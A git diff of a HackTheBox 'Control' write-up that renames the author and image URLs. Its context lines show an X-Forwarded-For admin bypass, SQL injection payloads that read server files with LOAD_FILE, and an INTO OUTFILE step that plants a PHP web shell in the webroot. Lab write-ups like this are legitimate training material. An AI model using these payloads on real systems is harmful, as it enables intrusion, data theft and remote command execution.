@@ -1,6 +1,6 @@
 ---
-title: Control HackTheBox writeup made by a dumb !!!
-author: dumbx90
+title: Control HackTheBox writeup
+author: pwndumb
 date: 2020-04-29 14:10:00 +0800
 categories: [HTB, Writeup]
 tags: [htb,pentest,windows,hard,services,retired]
@@ -8,7 +8,7 @@ tags: [htb,pentest,windows,hard,services,retired]
 
 
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-infocard.png" alt="control-webpage" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/control/control-infocard.png" alt="control-webpage" style="zoom:75%;" />
 
 
 
@@ -85,7 +85,7 @@ In the nmap we found some defautl ports open. Lets check the http page:
 
  
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-webpage.png" alt="control-webpage" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/control/control-webpage.png" alt="control-webpage" style="zoom:75%;" />
 
 
 
@@ -93,7 +93,7 @@ The fisrt thing came to my attention is the link **Admin** in  the right side, a
 
 
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-admin-webpage.png" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/control/control-admin-webpage.png" style="zoom:75%;" />
 
 
 
@@ -152,11 +152,11 @@ X-Forwarded-For         [Status: 200, Size: 7933, Words: 327, Lines: 154]
 
 So the **X-Forwarded-For** header works well. Lets install the extension **Modify Header Value**. After this we can access the  **Admin** page:
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-header-xforwarded-for.png" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/control/control-header-xforwarded-for.png" style="zoom:75%;" />
 
 
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-admin-webpage-access.png" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/control/control-admin-webpage-access.png" style="zoom:75%;" />
 
 
 
@@ -230,7 +230,7 @@ X-Forwarded-For: 192.168.4.28
 productName=1
 ```
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-burp-request-1.png" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/control/control-burp-request-1.png" style="zoom:75%;" />
 
 
 
@@ -276,7 +276,7 @@ X-Forwarded-For: 192.168.4.28
 productName=' order by 1 -- #
 ```
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-order-by-1.png" alt="control-order-by-1" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/control/control-order-by-1.png" alt="control-order-by-1" style="zoom:75%;" />
 
 
 
@@ -299,7 +299,7 @@ X-Forwarded-For: 192.168.4.28
 productName=' order by 7 -- #
 ```
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-order-by-7.png" alt="control-order-by-7" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/control/control-order-by-7.png" alt="control-order-by-7" style="zoom:75%;" />
 
 
 
@@ -353,11 +353,11 @@ productName=' union select 1,2,3,4,5,group_concat(GRANTEE,":",PRIVILEGE_TYPE,":"
 7. Load files:
 
 ```php
-productName=' union select 1,2,3,4,5,(Select concat ("dumb","\n", TO_BASE64(LOAD_FILE("C:\\inetpub\\wwwroot\\index.php")),"\n","dumb"))  -- #
+productName=' union select 1,2,3,4,5,(Select concat ("pwndumb","\n", TO_BASE64(LOAD_FILE("C:\\inetpub\\wwwroot\\index.php")),"\n","pwndumb"))  -- #
 ```
 
 ````php
-productName=' union select 1,2,3,4,5,(Select concat ("dumb","\n", TO_BASE64(LOAD_FILE("C:\\inetpub\\wwwroot\\admin.php")),"\n","dumb"))  -- #
+productName=' union select 1,2,3,4,5,(Select concat ("pwndumb","\n", TO_BASE64(LOAD_FILE("C:\\inetpub\\wwwroot\\admin.php")),"\n","pwndumb"))  -- #
 ````
 
 ````php
@@ -389,7 +389,7 @@ productName=' union select 1,2,3,4,5,"AAAAAAAAAA" INTO OUTFILE "C:\\inetpub\\www
 
 We get a **mysql** error, but if we try the same command again, **mysql** tell us that file already exist.
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-upload-file-error.png" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/control/control-upload-file-error.png" style="zoom:75%;" />
 
 
 
@@ -397,7 +397,7 @@ Thats right, beside the **mysql** error the file was created:
 
 
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-upload-dumb-txt.png" alt="control-upload-dumb-txt" style="zoom:67%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/control/control-upload-dumb-txt.png" alt="control-upload-dumb-txt" style="zoom:67%;" />
 
 
 
@@ -415,7 +415,7 @@ Lets create a simple php shell:
 productName=' union select 1,2,3,4,5,"<?php system($_REQUEST[\'cmd\']); ?>" INTO OUTFILE "C:\\inetpub\\wwwroot\\dumb.php"  -- #
 ````
 
-<img src="https://raw.githubusercontent.com/dumbx90/dumbx90.github.io/master/assets/img/commons/hackthebox/control/control-shell-command-whoami.png" alt="control-shell-command-whoami" style="zoom:75%;" />
+<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/hackthebox/control/control-shell-command-whoami.png" alt="control-shell-command-whoami" style="zoom:75%;" />
 
 
 
